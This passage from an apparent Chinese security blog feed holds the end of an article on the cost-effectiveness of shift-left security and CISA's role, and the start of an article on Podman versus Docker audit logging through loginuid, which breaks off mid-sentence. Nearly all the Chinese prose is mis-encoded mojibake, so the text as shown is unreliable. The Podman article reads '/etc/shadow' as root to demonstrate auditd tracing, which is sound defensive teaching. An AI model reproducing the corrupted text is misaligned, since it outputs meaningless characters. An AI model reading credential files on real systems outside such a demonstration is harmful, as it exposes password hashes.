id="0x04-åœ¨å¼€å‘è¿‡ç¨‹ä¸­å°½æ—©å‘ç°å¹¶ä¿®å¤å®‰å…¨æ¼æ´çœŸçš„æ›´ç¬¦åˆæˆæœ¬æ•ˆç›Šå—ï¼Ÿ"><a href="#0x04-åœ¨å¼€å‘è¿‡ç¨‹ä¸­å°½æ—©å‘ç°å¹¶ä¿®å¤å®‰å…¨æ¼æ´çœŸçš„æ›´ç¬¦åˆæˆæœ¬æ•ˆç›Šå—ï¼Ÿ" class="headerlink" title="0x04 åœ¨å¼€å‘è¿‡ç¨‹ä¸­å°½æ—©å‘ç°å¹¶ä¿®å¤å®‰å…¨æ¼æ´çœŸçš„æ›´ç¬¦åˆæˆæœ¬æ•ˆç›Šå—ï¼Ÿ"></a>0x04 åœ¨å¼€å‘è¿‡ç¨‹ä¸­å°½æ—©å‘ç°å¹¶ä¿®å¤å®‰å…¨æ¼æ´çœŸçš„æ›´ç¬¦åˆæˆæœ¬æ•ˆç›Šå—ï¼Ÿ</h2><h3 id="4-1-å¼€å‘æ—©æœŸä¿®å¤è½¯ä»¶æ¼æ´åˆç†æ€§çš„-100-å€æŒ‡æ ‡"><a href="#4-1-å¼€å‘æ—©æœŸä¿®å¤è½¯ä»¶æ¼æ´åˆç†æ€§çš„-100-å€æŒ‡æ ‡" class="headerlink" title="4.1 å¼€å‘æ—©æœŸä¿®å¤è½¯ä»¶æ¼æ´åˆç†æ€§çš„ 100 å€æŒ‡æ ‡"></a>4.1 å¼€å‘æ—©æœŸä¿®å¤è½¯ä»¶æ¼æ´åˆç†æ€§çš„ 100 å€æŒ‡æ ‡</h3><p>å¤§å®¶æ™®éè®¤ä¸ºï¼Œæ—©æœŸä¿®å¤æ¼æ´æ›´å…·æˆæœ¬æ•ˆç›Šï¼Œâ€å·¦ç§»â€ï¼ˆShift leftï¼‰ä¹Ÿå¼ºè°ƒåœ¨å¼€å‘è¿‡ç¨‹ä¸­å°½æ—©åœ°è¿›è¡Œæµ‹è¯•æ´»åŠ¨ã€‚</p><p><strong>å®‰å…¨å·¦ç§»çš„ç†å¿µæ˜¯ï¼šå°½æ—©è¯†åˆ«å‡ºå®‰å…¨æ¼æ´ä¸ä»…èƒ½ç”Ÿäº§å‡ºæ›´é«˜è´¨é‡çš„äº§å“ï¼Œè¿˜èƒ½é™ä½å®‰å…¨æˆæœ¬ã€‚ç„¶è€Œï¼Œé—®é¢˜åœ¨äºï¼šå¦‚ä½•é‡åŒ–æŠ•èµ„ã€‚</strong></p><p>è½¯ä»¶è¡Œä¸šæœ‰è®¸å¤šæ–‡ç« æåˆ° IBM ç³»ç»Ÿç§‘å­¦ç ”ç©¶æ‰€çš„ä¸€é¡¹ç ”ç©¶ï¼Œç§°åœ¨è®¾è®¡é˜¶æ®µä¿®å¤æ¼æ´çš„æˆæœ¬æ¯”å®æ–½åä¿®å¤æ¼æ´çš„æˆæœ¬ä½ 100 å€ã€‚ä½†ç»è¿‡è¿›ä¸€æ­¥ç ”ç©¶å‘ç°ï¼Œæ²¡æœ‰è¯æ®è¡¨æ˜ IBM ç³»ç»Ÿç§‘å­¦ç ”ç©¶é™¢æ˜¯ä¸€ä¸ªå®˜æ–¹çš„ç ”ç©¶æœºæ„ã€‚å®ƒä¼¼ä¹æ˜¯ IBM çš„ä¸€ä¸ªå†…éƒ¨é¡¹ç›®ï¼Œä¸”è‡ª 20 ä¸–çºª 80 å¹´ä»£ä»¥æ¥å°±ä¸å­˜åœ¨äº†ã€‚</p><p>æ­¤å¤–ï¼Œå¤§å¤šæ•°äººè¿˜å¼•ç”¨äº† Barry Boehm äº 1988 å¹´çš„ä¸€é¡¹å£°æ˜ï¼Œå³åœ¨äº¤ä»˜åæŸ¥æ‰¾å¹¶ä¿®å¤è½¯ä»¶é—®é¢˜çš„æˆæœ¬é€šå¸¸æ¯”åœ¨è®¾è®¡é˜¶æ®µæŸ¥æ‰¾é—®é¢˜çš„æˆæœ¬é«˜ 100 å€ã€‚ç„¶è€Œï¼Œç”¨äºæ­¤æˆæœ¬ä¼°ç®—çš„å…·ä½“æˆæœ¬å› ç´ å°šä¸æ¸…æ¥šï¼Œå¹¶ä¸”è‡ª 20 ä¸–çºª 80 å¹´ä»£ä»¥æ¥è½¯ä»¶å¼€å‘å®è·µå·²ç»å‘å±•å¾—æ›´åŠ æ•æ·ã€‚</p><p>æœ€è¿‘ï¼Œ<a href="https://www.ibm.com/reports/data-breach" title="IBM å’Œ Ponemon Institute è¿˜å‘å¸ƒäº†æœ‰å…³å®‰å…¨æ¼æ´æˆæœ¬çš„æŠ¥å‘Š">IBM å’Œ Ponemon Institute è¿˜å‘å¸ƒäº†æœ‰å…³å®‰å…¨æ¼æ´æˆæœ¬çš„æŠ¥å‘Š</a>ï¼Œä½†è¿™äº›æŠ¥å‘Šä¸åŒ…æ‹¬æœ‰å…³åœ¨å®‰å…¨æ¼æ´å‘ç”Ÿä¹‹å‰å‘ç°å¹¶ä¿®å¤å®‰å…¨æ¼æ´æˆæœ¬çš„ä»»ä½•æ•°æ®ã€‚</p><p><img src="/image/672.png" alt="å›¾ 7ï¼šIBM å’Œ Ponemon Institute å‘å¸ƒçš„å…³äºå®‰å…¨æ¼æ´æˆæœ¬çš„æŠ¥å‘Š"></p><h3 id="4-2-å°šæ— è¡¡é‡æˆæœ¬çš„ç­–ç•¥"><a href="#4-2-å°šæ— è¡¡é‡æˆæœ¬çš„ç­–ç•¥" class="headerlink" title="4.2 å°šæ— è¡¡é‡æˆæœ¬çš„ç­–ç•¥"></a>4.2 å°šæ— è¡¡é‡æˆæœ¬çš„ç­–ç•¥</h3><p>SBD è¿˜æ³¨æ„åˆ°ï¼Œå…¬å¸å¹¶æ²¡æœ‰è¡¡é‡ä¸éµå¾ªå®‰å…¨è®¾è®¡åŸåˆ™çš„çœŸå®æˆæœ¬ï¼Œè€Œä¸”ç›®å‰è¿˜æ²¡æœ‰ä¸€ä¸ªç»Ÿä¸€çš„ç­–ç•¥æ¥ç†è§£ä¸å®‰å…¨çš„æ€»æ‹¥æœ‰æˆæœ¬ã€‚</p><p><img src="/image/673.png" alt="å›¾ 8ï¼šCISA è®¤åŒâ€œå·¦ç§»â€æ˜¯æœ‰ç»æµæ•ˆç›Šçš„ï¼Œå…³é”®åœ¨äºç»„ç»‡åº”è¯¥æŠ•å…¥å¤šå°‘æ‰å¯ä»¥è·å¾—ç»æµæ•ˆç›Š"></p><p><strong>å°½ç®¡å…³äºæ—©æœŸå‘ç°å®‰å…¨æ¼æ´çš„ç»æµæ•ˆç›Šå¹¶æ²¡æœ‰ç¡®åˆ‡çš„æ•°æ®ï¼Œä½†æ™®éè®¤ä¸ºæ—©æœŸå‘ç°æ˜¯æœ‰ç»æµç›Šå¤„çš„ã€‚é—®é¢˜æ˜¯ï¼Œä¸€ä¸ªç»„ç»‡éœ€è¦æŠ•å…¥å¤šå¤§çš„æ¯”ä¾‹æ‰èƒ½å®ç°è¿™ç§ç›Šå¤„ï¼Ÿ</strong></p><h3 id="4-3-CISA-æ˜¯å¦å¯ä¿ƒè¿›è‡ªåŠ¨åŒ–æŒ‡æ ‡çš„ç ”ç©¶å’Œå¼€å‘"><a href="#4-3-CISA-æ˜¯å¦å¯ä¿ƒè¿›è‡ªåŠ¨åŒ–æŒ‡æ ‡çš„ç ”ç©¶å’Œå¼€å‘" class="headerlink" title="4.3 CISA æ˜¯å¦å¯ä¿ƒè¿›è‡ªåŠ¨åŒ–æŒ‡æ ‡çš„ç ”ç©¶å’Œå¼€å‘"></a>4.3 CISA æ˜¯å¦å¯ä¿ƒè¿›è‡ªåŠ¨åŒ–æŒ‡æ ‡çš„ç ”ç©¶å’Œå¼€å‘</h3><p>ç†æƒ³æƒ…å†µä¸‹ï¼Œä»»ä½•è½¯ä»¶é¡¹ç›®åœ¨æŠ•å…¥ç”Ÿäº§ç¯å¢ƒä¹‹å‰éƒ½åº”è¯¥ç»å†ä¸€ç³»åˆ—è‡ªåŠ¨åŒ–çš„å®‰å…¨æ£€æŸ¥ã€‚éšç€æ–°çš„è‡ªåŠ¨åŒ–æ£€æŸ¥çš„å¢åŠ ï¼Œå®‰å…¨æ ‡å‡†å°†æŒç»­æé«˜ã€‚</p><p>CISA å¯ä»¥åœ¨ç­–åˆ’åº”æ‰§è¡Œçš„æ ‡å‡†å®‰å…¨æ£€æŸ¥æ–¹é¢å‘æŒ¥ä½œç”¨ã€‚å¯¹äºå…³é”®åŸºç¡€è®¾æ–½ï¼ŒCISA è¿˜å¯ä»¥åœ¨æµ‹è¯•è¿™äº›å®‰å…¨æ£€æŸ¥å¹¶ç»™å‡ºæŠ¥å‘Šæ–¹é¢å‘æŒ¥ä½œç”¨ã€‚</p><p>è®¸å¤šç›®å‰å¯ç”¨çš„å®‰å…¨æ£€æŸ¥æ—¨åœ¨å‘ç°æºä»£ç ä¸­çš„ç¼ºé™·å®ä¾‹ï¼Œä½†æœ¬è´¨ä¸Šæ— æ³•æ‰¾åˆ°æ‰€æœ‰ï¼ˆç”šè‡³å¤§å¤šæ•°ï¼‰æ­¤ç±»æ¼æ´çš„å®ä¾‹ã€‚</p><p>CISA å¯ä»¥ä¿ƒè¿›ç ”ç©¶å’Œå¼€å‘è‡ªåŠ¨åŒ–æŒ‡æ ‡ï¼Œä»¥ç¡®å®šè½¯ä»¶æ˜¯å¦ç¬¦åˆå®‰å…¨è®¾è®¡å®è·µå’ŒåŸåˆ™ï¼Œä¾‹å¦‚â€œè¡¡é‡ä¼˜ç‚¹â€ä¸â€œè¡¡é‡ç¼ºç‚¹â€ã€‚</p><p>å°ç»„å§”å‘˜ä¼šä¸ CISA çš„æ³•å¾‹å›¢é˜Ÿå’Œè¯„ä¼°å›¢é˜Ÿè¿›è¡Œäº†ä¼šé¢ï¼Œå¹¶å‘ç° CISA å¯ä»¥ä½¿ç”¨ç°æœ‰æœºåˆ¶æ¥è¯„ä¼°å…³é”®åŸºç¡€è®¾æ–½å¹¶å‘å¸ƒç»“æœï¼Œä½†è¿™ä¹Ÿå­˜åœ¨ä¸€äº›é™åˆ¶ï¼š</p><ul><li>CISA ä¸èƒ½å¼ºåˆ¶è¦æ±‚å…³é”®åŸºç¡€è®¾æ–½å®ä½“è¿›è¡Œç½‘ç»œå®‰å…¨å½±å“è¯„ä¼°ã€‚</li><li>å¦‚æœå…³é”®åŸºç¡€è®¾æ–½å®ä½“è‡ªæ„¿é€‰æ‹©å‚ä¸ï¼ŒCISA å¯èƒ½èƒ½å¤Ÿå¯¹å…¶ç½‘ç»œå®‰å…¨å½±å“è¿›è¡Œè¯„ä¼°ã€‚</li><li>é€šå¸¸æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰å®ä½“çš„è®¸å¯ï¼ŒCISA ä¸èƒ½å‘å¸ƒè¯„ä¼°ç»“æœã€‚</li></ul><p><strong>æœ€é‡è¦çš„æ˜¯ï¼ŒCISA å½±å“ç®¡ç†å…³é”®åŸºç¡€è®¾æ–½å®ä½“çš„é¢„ç®—å†³ç­–çš„é€”å¾„æœ‰é™ã€‚åº”è¯¥èµ‹äºˆ CISA æ›´å¤šçš„å½±å“åŠ›ã€‚</strong></p><h2 id="0x05-æ€»ç»“ä¸å»ºè®®"><a href="#0x05-æ€»ç»“ä¸å»ºè®®" class="headerlink" title="0x05 æ€»ç»“ä¸å»ºè®®"></a>0x05 æ€»ç»“ä¸å»ºè®®</h2><p><strong>è‹¥è¦ç ”ç©¶æ˜¯å¦å¯ä»¥ä½¿ç”¨æ˜ç¡®çš„æŒ‡æ ‡æ¥é‡åŒ–é‚£äº›ç»å†è¿‡å¤§è§„æ¨¡å®‰å…¨äº‹ä»¶å¹¶æˆåŠŸå¤è‹çš„å…¬å¸çš„è´¢åŠ¡å½±å“å’Œå®¢æˆ·ä½“éªŒå½±å“ï¼Œå°†é•¿è¾¾ä¸‰åˆ°äº”å¹´çš„æ—¶é—´ã€‚</strong> åœ¨æ•°æ®æ”¶é›†æ—¶ï¼Œåº”è¯¥æ¢è®¨ä»¥ä¸‹é—®é¢˜ï¼š</p><ul><li>æ–°è€å®¢æˆ·åœ¨é¢å¯¹å¤§è§„æ¨¡å®‰å…¨äº‹ä»¶æ—¶çš„è¡Œä¸ºååº”ï¼›</li><li>éšç€æ—¶é—´æ¨ç§»ï¼Œä»å®‰å…¨äº‹ä»¶ä¸­æ¢å¤çš„æ€»æˆæœ¬ã€‚</li></ul><p><strong>åº”è¿›ä¸€æ­¥ç ”ç©¶ï¼Œä»¥æä¾›å®è¯æ•°æ®æ¥è¯å®åœ¨è½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸæ—©æœŸä¿®å¤å®‰å…¨æ¼æ´æ˜¯å¦ç¡®å®æ›´å…·æˆæœ¬æ•ˆç›Šã€‚</strong></p><ul><li>è‹¥æ— æ³•ç¡®å®šå®æ–½å®‰å…¨è®¾è®¡åŸåˆ™çš„å…·ä½“ç¾é‡‘ï¼Œä½†æä¾›ç›¸å…³çš„æŠ•èµ„æ¯”ä¾‹çš„æŒ‡å¯¼ä¹Ÿå¯èƒ½ä¼šé¼“åŠ±ç»„ç»‡é‡‡ç”¨è¿™äº›åŸåˆ™ï¼›</li><li>è‹¥æ²¡æœ‰å‘ç°å¯è¡¡é‡çš„è´¢åŠ¡å½±å“ï¼Œé‚£ä¹ˆæ”¾å¼ƒä½¿ç”¨ç»æµæ•ˆç›Šä½œä¸ºå®‰å…¨å¼€å‘çš„æ¿€åŠ±å¯èƒ½ä¹Ÿæ˜¯æœ‰æ„ä¹‰çš„ã€‚</li></ul><p><strong>è€ƒè™‘åˆ° CISA ä¹‹å‰æå‡ºçš„é™åˆ¶ï¼ŒCISA ä»éœ€ç»è¿‡å¤šå¹´çš„ä¸æ‡ˆå¥‹æ–—ï¼Œæ‰èƒ½è¿ˆå‡ºå®ˆæŠ¤å…³é”®åŸºç¡€è®¾æ–½å®‰å…¨çš„å…³é”®ç¬¬ä¸€æ­¥ã€‚</strong> ä¾‹å¦‚ï¼š</p><ul><li>è®¾è®¡ä¸€ä¸ªæ¡†æ¶ä¸”æ ‡å‡†åŒ–çš„â€œå®‰å…¨å½±å“ç ”ç©¶â€ï¼Œè¿™ä¸ªç ”ç©¶åº”è¯¥æ˜¯è½»é‡çº§çš„ï¼ŒåŸºäºç°æœ‰æ ‡å‡†ï¼ˆå¦‚ç¾å›½å›½å®¶æ ‡å‡†ä¸æŠ€æœ¯ç ”ç©¶é™¢æˆ– CISA çš„â€œå®‰å…¨è®¾è®¡â€åŸåˆ™ï¼‰ï¼Œå¹¶ä¸”å®¹æ˜“è¢«æŠ€æœ¯å’ŒéæŠ€æœ¯äººå‘˜ç†è§£å’Œæ‰§è¡Œã€‚è¿™é¡¹ç ”ç©¶éœ€è¦ä»¥ä¸€ç§å…·æœ‰æˆæœ¬æ•ˆç›Šçš„æ–¹å¼è¿›è¡Œã€‚</li><li>è¿™äº›å½±å“ç ”ç©¶åº”è¯¥åŸºäºè‡ªæ„¿æˆ–é€‰æ‹©åŠ å…¥çš„åŸåˆ™è¿›è¡Œï¼Œå¹¶å‘ä»»ä½•å±äºå›½å®¶å…³é”®åŸºç¡€è®¾æ–½çš„ç»„ç»‡æä¾›ã€‚ç ”ç©¶çš„ç»“æœåº”è¯¥åªæä¾›ç»™å‚ä¸çš„ç»„ç»‡ï¼Œä¸” CISA åº”è¯¥å®šæœŸå…¬å¼€å‘å¸ƒæ±‡æ€»æˆ–åŒ¿ååŒ–çš„æ•°æ®ã€‚</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>å®‰å…¨å»ºè®¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸ºä»€ä¹ˆ Podman æ¯” Docker æ›´å®‰å…¨ï¼ˆä¸€ï¼‰</title>
    <link href="/2025/01/09/%E4%B8%BA%E4%BB%80%E4%B9%88-Podman-%E6%AF%94-Docker-%E6%9B%B4%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2025/01/09/%E4%B8%BA%E4%BB%80%E4%B9%88-Podman-%E6%AF%94-Docker-%E6%9B%B4%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ä»Šå¤©ï¼Œæˆ‘ä»¬å°†ä»æ—¥å¿—å®¡è®¡çš„è§’åº¦æ¢è®¨ï¼šä¸ºä»€ä¹ˆ Podman æ¯” Docker æ›´å®‰å…¨ï¼Ÿ</p><ol><li>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦äº†è§£ Linux çš„ audit æ—¥å¿—å®¡è®¡åŠŸèƒ½å’Œ <code>loginuid</code> çš„åŸºç¡€çŸ¥è¯†ï¼›</li><li>ç„¶åï¼Œæˆ‘ä»¬å°†åˆ†åˆ«ä½¿ç”¨ Podman å’Œ Docker å¯åŠ¨å®¹å™¨ï¼Œåˆ†æå®¹å™¨ä¸­ <code>loginuid</code> çš„å˜åŒ–åŠå…¶åŸå› ï¼›</li><li>æœ€åï¼Œæˆ‘ä»¬å°†é€šè¿‡çœŸå®æ”»å‡»åœºæ™¯ï¼Œå±•ç¤º <code>loginuid</code> çš„å˜åŒ–å¦‚ä½•å½±å“å®‰å…¨é˜²æŠ¤ï¼›</li></ol><p>æœ¬æ–‡æ‰€æœ‰çš„éªŒè¯éƒ½åœ¨ ubuntu 22.04 ä¹‹ä¸Šè¿›è¡Œï¼Œä¸”ç™»å½•ç”¨æˆ·ä¸º <code>yaney</code>ã€‚</p><p><img src="/image/657.webp" alt="å›¾ 1:æ“ä½œç¯å¢ƒ"></p><h2 id="0x01-Linux-çš„åŸºç¡€çŸ¥è¯†"><a href="#0x01-Linux-çš„åŸºç¡€çŸ¥è¯†" class="headerlink" title="0x01 Linux çš„åŸºç¡€çŸ¥è¯†"></a>0x01 Linux çš„åŸºç¡€çŸ¥è¯†</h2><h3 id="1-1-audit-å®¡è®¡åŠŸèƒ½"><a href="#1-1-audit-å®¡è®¡åŠŸèƒ½" class="headerlink" title="1.1 audit å®¡è®¡åŠŸèƒ½"></a>1.1 audit å®¡è®¡åŠŸèƒ½</h3><p>åœ¨è®¨è®º <a href="https://podman.io/" title="Podman">Podman</a> å’Œ Docker çš„å®‰å…¨æ€§ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£ä¸€äº›å…³äº Linux audit å®¡è®¡åŠŸèƒ½çš„åŸºç¡€çŸ¥è¯†ã€‚</p><p>Linux å†…æ ¸æœ‰ä¸€ä¸ªåä¸º audit çš„å®‰å…¨åŠŸèƒ½ï¼Œç®¡ç†å‘˜å¯ä»¥é€šè¿‡è¯¥åŠŸèƒ½ç›‘è§†ç³»ç»Ÿä¸Šçš„å®‰å…¨äº‹ä»¶ï¼Œå¹¶è®°å½•åœ¨æœ¬åœ°çš„ <code>audit.log</code> æ–‡ä»¶ä¸­ã€‚æ­¤å¤–ï¼Œaudit æ—¥å¿—è¿˜å¯ä»¥è¿œç¨‹å­˜å‚¨åœ¨å…¶ä»–ä¸»æœºä¸Šï¼Œä»¥é˜²æ”»å‡»è€…è¯•å›¾æ©ç›–å…¶å…¥ä¾µçš„ç—•è¿¹ã€‚</p><p>æˆ‘ä»¬ä»¥å®¡è®¡ <code>/etc/shadow</code> æ–‡ä»¶ä¸Šçš„æ“ä½œä¸ºä¾‹è¿›è¡Œè¯´æ˜ã€‚<code>/etc/shadow</code> æ–‡ä»¶æ˜¯ä¸€ä¸ªå¸¸è§çš„å®‰å…¨æ–‡ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥å‘å…¶ä¸­å¢åŠ è®°å½•ï¼Œä»è€Œé‡æ–°è·å¾—ç³»ç»Ÿçš„è®¿é—®æƒé™ã€‚</p><p><img src="/image/658.png" alt="å›¾ 2: é€šè¿‡ audit å®¡è®¡ &#x2F;etc&#x2F;shadowï¼Œå¹¶å¯¹ &#x2F;etc&#x2F;shadow è¿›è¡Œæ“ä½œ"></p><ol><li><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå·¦è¾¹å›¾æˆ‘ä»¬å®‰è£…äº† auditd è½¯ä»¶åŒ…ï¼Œå¹¶é€šè¿‡ <code>auditctl</code> å†™å…¥è§„åˆ™ï¼Œå¼€å§‹å®¡è®¡ <code>/etc/shadow</code> æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> auditctl -w /etc/shadow<br><br></code></pre></td></tr></table></figure></li><li><p>å³è¾¹çš„å›¾ï¼Œæˆ‘ä»¬åˆ‡æ¢åˆ° root ç”¨æˆ·èº«ä»½ï¼Œå¹¶é€šè¿‡ä¸‹é¢å‘½ä»¤ï¼Œå¯¹ç›®æ ‡æ–‡ä»¶è¿›è¡Œæ“ä½œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shadow<br><br></code></pre></td></tr></table></figure></li><li><p>æœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨ audit æ‰€æä¾›çš„å·¥å…· <code>ausearch</code> æ¥æœç´¢è¿‘æœŸä¸ <code>/etc/shadow</code> æ–‡ä»¶ç›¸å…³çš„äº‹ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ausearch -f /etc/shadow -i -ts recent<br><br></code></pre></td></tr></table></figure></li></ol><p>ä¸€ä¼šå„¿æ—¶é—´ï¼Œaudit å°±è®°å½•äº†è®¸å¤šä¿¡æ¯ï¼Œæˆ‘ä»¬ä¸éœ€è¦å»è§£è¯»è¿™äº›ä¿¡æ¯ï¼Œåªéœ€å…³æ³¨ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯ï¼š<strong>ä¸ºä»€ä¹ˆ audit èƒ½å¤Ÿæ­£ç¡®åœ°è®°å½•æ˜¯ root ç”¨æˆ·ï¼ˆuid&#x3D;rootï¼‰æŸ¥çœ‹äº†</strong> <code>/etc/shadow</code> <strong>æ–‡ä»¶ï¼Œä½†è¯¥è¿›ç¨‹çš„åŸå§‹ç™»å½•ç”¨æˆ·ï¼ˆauid&#x3D;yaneyï¼‰æ˜¯ yaney å‘¢ï¼Ÿ</strong></p><p><img src="/image/659.png" alt="å›¾ 3:audit å¯ä»¥æ­£ç¡®è®°å½•åŸå§‹ç™»å½•ç”¨æˆ·æ˜¯ yaney"></p><h3 id="1-2-loginuid"><a href="#1-2-loginuid" class="headerlink" title="1.2 loginuid"></a>1.2 loginuid</h3><p>è¦å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ä¸å¾—ä¸äº†è§£ Linux å†…æ ¸æœ‰ä¸ªåä¸º<code>loginuid</code>çš„å±æ€§äº†ã€‚</p><p><code>loginuid</code>å­˜å‚¨åœ¨è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ<code>/proc/self/loginuid</code> ä¸­ï¼Œç”¨æ¥æ ‡è¯†ç™»å½•çš„ç”¨æˆ·ã€‚æ¯å½“æˆ‘ä»¬ç™»å½•ç³»ç»Ÿæ—¶ï¼Œ<code>loginuid</code>å°±è¢«è®¾ç½®ä¸ºç”¨æˆ·çš„ IDï¼ˆ<code>UID</code>ï¼‰ï¼Œä¸”å†…æ ¸ä¸å…è®¸ä»»ä½•è¿›ç¨‹å¯¹ä»–è¿›è¡Œä¿®æ”¹ã€‚</p><p>æœ€é‡è¦çš„æ˜¯ï¼Œ<strong>ä»è¯¥ç™»å½•è¿›ç¨‹æ´¾ç”Ÿå‡ºæ¥çš„æ‰€æœ‰å­è¿›ç¨‹éƒ½ä¼šç»§æ‰¿è¿™ä¸ª <code>loginuid</code>ï¼Œå¹¶å½¢æˆä¸€æ¡â€œè·Ÿè¸ªé“¾â€</strong>ï¼Œè¿™ä½¿å¾—ç³»ç»Ÿèƒ½å¤Ÿè¿½è¸ªåˆ°å½“å‰æ´»åŠ¨æ˜¯ç”±å“ªä¸ªç™»å½•ç”¨æˆ·å‘èµ·çš„ã€‚ä¾‹å¦‚ï¼šå½“æˆ‘ä»¥ yaney çš„èº«ä»½è¿›å…¥ç³»ç»Ÿæ—¶ï¼Œ<code>loginuid</code> çš„ç¼–å·ä¸º 1000ï¼›å½“æˆ‘åˆ‡æ¢ç”¨æˆ·è‡³ root æ—¶ï¼Œ<code>loginuid</code>çš„ç¼–å·è¿˜æ˜¯ 1000ã€‚</p><p><img src="/image/660.png" alt="å›¾ 4: ç”±ç™»å½•è¿›ç¨‹æ´¾ç”Ÿå‡ºæ¥çš„å­è¿›ç¨‹ä¼šç»§ç»­ç»§æ‰¿ loginuid"></p><h2 id="0x02-Podman-å’Œ-Docker-å®¹å™¨ä¸­çš„-loginuid-å·®å¼‚"><a href="#0x02-Podman-å’Œ-Docker-å®¹å™¨ä¸­çš„-loginuid-å·®å¼‚" class="headerlink" title="0x02 Podman å’Œ Docker å®¹å™¨ä¸­çš„ loginuid å·®å¼‚"></a>0x02 Podman å’Œ Docker å®¹å™¨ä¸­çš„ loginuid å·®å¼‚</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œå®¹å™¨åªæ˜¯å®¿ä¸»æœºä¸­ä¸€ä¸ªç‰¹æ®Šçš„è¿›ç¨‹ï¼Œé‚£ä¹ˆå®¹å™¨ä¸­çš„<code>loginuid</code>åˆæ˜¯æ€æ ·çš„å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬åˆ†åˆ«ç”¨ Podman å’Œ Docker å¯åŠ¨å®¹å™¨ï¼Œå‘ç°ï¼š**Podman çš„å®¹å™¨æ­£ç¡®è®°å½•äº†æˆ‘ä»¬çš„<code>loginuid</code>ï¼Œè€Œ Docker çš„å®¹å™¨è®°å½•çš„å´<code>4294967295</code>ã€‚**docker æ‰€è®°å½•çš„è¿™ä¸ªæ•°å­—å¹¶ä¸æ˜¯ä¸€ä¸ªéšæœºçš„æ•°å­—ï¼Œæˆ‘ä»¬åé¢å†è¯´ã€‚</p><p><img src="/image/661.png" alt="å›¾ 5:docker å®¹å™¨å’Œ podman å®¹å™¨ä¸­çš„ loginuid ä¸ä¸€è‡´"></p><p>é‚£ä¹ˆï¼Œé€ æˆè¿™ç§å·®å¼‚çš„åŸå› åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><p><strong>Podman ä½¿ç”¨çš„æ˜¯ä¼ ç»Ÿçš„ fork&#x2F;exec æ¨¡å‹</strong>ï¼Œå³ Podman è°ƒç”¨ <code>fork</code> ç³»ç»Ÿè°ƒç”¨æ¥åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œè¿™ä¸ªå­è¿›ç¨‹å‡ ä¹å®Œå…¨å¤åˆ¶äº†çˆ¶è¿›ç¨‹çš„çŠ¶æ€ï¼Œä¸çˆ¶è¿›ç¨‹å…±äº«ç›¸åŒçš„å†…å­˜å†…å®¹ã€‚å­è¿›ç¨‹åˆ›å»ºåï¼Œå†è°ƒç”¨ <code>exec</code> æˆ– <code>execve</code> æ¥æ›¿æ¢è‡ªå·±çš„ä»£ç å’Œæ•°æ®ã€‚å› æ­¤ Podman å®¹å™¨è¿›ç¨‹æ˜¯ Podman çš„åä»£ï¼Œpodman å®¹å™¨ä¸­çš„<code>loginuid</code>ä¸å®¿ä¸»æœºä¸Šçš„<code>loginuid</code>å®Œå…¨ä¸€è‡´ã€‚</p><p>**è€Œ Docker ä½¿ç”¨çš„æ˜¯ C&#x2F;S æ¨¡å‹ã€‚**å½“æˆ‘ä»¬æ‰§è¡Œ docker å‘½ä»¤æ—¶ï¼Œæœ¬è´¨ä¸Šæ˜¯ Docker å®¢æˆ·ç«¯å·¥å…·ï¼ˆdocker cliï¼‰å‘ Docker å®ˆæŠ¤è¿›ç¨‹ï¼ˆdockerdï¼‰å‘é€è¯·æ±‚ï¼Œdockerd æ¥å¤„ç†ä¸ docker cli çš„ stdin&#x2F;stdout é€šä¿¡å¹¶åˆ›å»ºå®¹å™¨ã€‚æ‰€ä»¥ Docker å®¹å™¨æ˜¯ dockerd çš„åä»£ï¼Œéœ€è¦ä¸å®ˆæŠ¤è¿›ç¨‹çš„<code>loginuid</code> ä¸€è‡´ã€‚</p><p>å‰é¢æˆ‘ä»¬è¯´äº† Docker å®¹å™¨çš„ <code>loginuid</code> å¹¶ä¸æ˜¯ä¸€ä¸ªéšæœºæ•°ï¼Œé‚£æ˜¯å› ä¸º dockerd æ˜¯åˆå§‹åŒ–ç³»ç»Ÿçš„å­è¿›ç¨‹ï¼Œå®ƒçš„ <code>loginuid</code> æ˜¯æœªç»è¿‡è®¾ç½®çš„é»˜è®¤å€¼ï¼Œå…·ä½“ä¸º 32 ä½æ— ç¬¦å·æ•´æ•°çš„æœ€å¤§å€¼<code>0xFFFFFFFF</code>ï¼Œå³åè¿›åˆ¶çš„<code>4294967295</code>ã€‚è¿™ç§æƒ…å†µï¼Œaudit ä¸€èˆ¬ä¼šå°† <code>auid</code> è®¾ç½®ä¸º <code>unset</code> è¡¨ç¤ºè¯¥è¿›ç¨‹æ— æ³•å…³è”åˆ°ç™»å½•ç”¨æˆ·ã€‚</p><p>æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ dockerd æˆ– systemd 